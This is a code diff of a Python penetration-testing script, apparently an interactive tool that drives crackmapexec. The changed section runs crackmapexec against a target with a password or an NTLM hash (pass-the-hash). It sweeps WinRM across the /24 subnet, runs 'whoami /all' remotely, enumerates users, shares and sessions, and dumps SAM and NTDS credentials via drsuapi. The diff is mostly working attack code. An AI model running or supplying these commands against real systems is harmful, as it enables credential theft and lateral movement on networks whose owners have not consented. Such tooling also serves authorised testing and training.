@@ -967,7 +967,7 @@ while True:
             IP46 = "-6"
          
          if DOMC == 1:
-            print("[+] Resetting current domain " + BAK + " association...")
+            print("[+] Resetting current domain " + BAK.rstrip(" ") + " association...")
             command("sed -i '$d' /etc/hosts")
             DOM = "EMPTY"
             DOM = spacePadding(DOM, COL1)
@@ -2502,51 +2502,57 @@ while True:
          print("[-] Both Password and Hash value have not been specified...")
          checkParams = 1
       
-      if (checkParams != 1) and (PAS[:2] != "''"):
-         if "5985" in PTS:
-            print("[+] Finding exploitable machines on the same subnet...\n")
-            command("crackmapexec winrm " + TIP.rstrip(" ") + "/24")
-            
-         if "445" in PTS:
-            print("\n[+] Checking priviliges...\n")
-            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " -X 'whoami /all'")                  
-            print("\n[+] Enumerating users...\n")
-            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " --users")      
-            print("\n[+] Enumerating shares...\n")
-            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " --shares")
-            print("\n[+] Enumerating sessions...\n")
-            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " --sessions")            
-            print("\n[+] Enumerating SAM...\n")
-            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " --local-auth --sam")
-            print("\n[+] Enumerating NTDS...\n")
-            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " --local-auth --ntds drsuapi")
-            checkParams = 1
-
       if checkParams != 1:
-         print("[i] Using HASH value as password credential...")  
+      
+         if PAS[:2] != "''":
+            checkParams = testFour("5985")            
+            if checkParams != 1:
+               print("[+] Finding exploitable machines on the same subnet...\n")
+               command("crackmapexec winrm " + TIP.rstrip(" ") + "/24")
+               
+            checkParams = testFour("445")
+            if checkParams != 1:
+               print("\n[+] Checking priviliges...\n")
+               command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " -X 'whoami /all'")                  
+               print("\n[+] Enumerating users...\n")
+               command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " --users")      
+               print("\n[+] Enumerating shares...\n")
+               command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " --shares")
+               print("\n[+] Enumerating sessions...\n")
+               command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " --sessions")            
+               print("\n[+] Enumerating SAM...\n")
+               command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " --local-auth --sam")
+               print("\n[+] Enumerating NTDS...\n")
+               command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " --local-auth --ntds drsuapi")
+         else:
+            print("[i] Using HASH value as password credential...")
+            
+            checkParams = testFour("5985")
+            if checkParams != 1:
+               print("[+] Finding exploitable machines on the same subnet...\n")
+               command("crackmapexec winrm " + TIP.rstrip(" ") + "/24")
+      
+            checkParams = testFour("445")
+            if checkParams != 1:
+               print("\n[+] Checking priviliges...\n")
+               command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H :" + NTM.rstrip(" ") + " -X 'whoami /all'")                     
+               print("\n[+] Enumerating users...\n")
+               command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H :" + NTM.rstrip(" ") + " --users")
+               print("\n[+] Enumerating shares...\n")
+               command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H :" + NTM.rstrip(" ") + " --shares")
+               print("\n[+] Enumerating sessions...\n")
+               command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H :" + NTM.rstrip(" ") + " --sessions")                        
+               print("\n[+] Enumerating SAM...\n")
+               command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H :" + NTM.rstrip(" ") + " --local-auth --sam")      
+               print("\n[+] Enumerating NTDS...\n")
+               command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H :" + NTM.rstrip(" ") + " --local-auth --ntds drsuapi")                    
 
-         if "5985" in PTS:
-            print("[+] Finding exploitable machines on the same subnet...\n")
-            command("crackmapexec winrm " + TIP.rstrip(" ") + "/24")
+      try:
+         null = input("\nPress ENTER to continue...")
+      except EOFError as e:
+         print("[!] Crackmap is generating this error: " + e + "...")
          
-         if "445" in PTS:
-            print("\n[+] Checking priviliges...\n")
-            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H :" + NTM.rstrip(" ") + " -X 'whoami /all'")                     
-            print("\n[+] Enumerating users...\n")
-            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H :" + NTM.rstrip(" ") + " --users")
-            print("\n[+] Enumerating shares...\n")
-            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H :" + NTM.rstrip(" ") + " --shares")
-            print("\n[+] Enumerating sessions...\n")
-            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H :" + NTM.rstrip(" ") + " --sessions")                        
-            print("\n[+] Enumerating SAM...\n")
-            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H :" + NTM.rstrip(" ") + " --local-auth --sam")      
-            print("\n[+] Enumerating NTDS...\n")
-            command("crackmapexec smb " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H :" + NTM.rstrip(" ") + " --local-auth --ntds drsuapi")                    
-
-         try:
-            null = input("\nPress ENTER to continue...")
-         except EOFError as e:
-            print(e)
+      prompt()
                
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
